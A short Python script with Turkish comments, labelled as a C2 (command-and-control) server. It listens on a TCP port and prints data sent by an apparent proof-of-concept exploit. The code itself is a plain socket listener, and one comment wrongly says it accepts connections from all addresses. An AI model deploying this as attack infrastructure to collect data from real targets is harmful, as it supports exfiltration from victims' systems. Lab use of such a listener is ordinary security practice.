import socket

# C2 Sunucusu
HOST = '127.0.0.1'  # Tüm IP adreslerinden gelen bağlantıları kabul et
PORT = 1234        # Yukarıda PoC'deki PORT ile aynı olmalı

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)  # Maksimum bağlantı kuyruğu

print(f"[*] Dinleniyor: {HOST}:{PORT}")

while True:
    client_socket, client_address = server_socket.accept()
    print(f"[+] Bağlantı alındı: {client_address}")
    data = client_socket.recv(1024)  # Veriyi oku
    print(f"[+] Gelen veri: {data.decode('utf-8')}")
    client_socket.close()
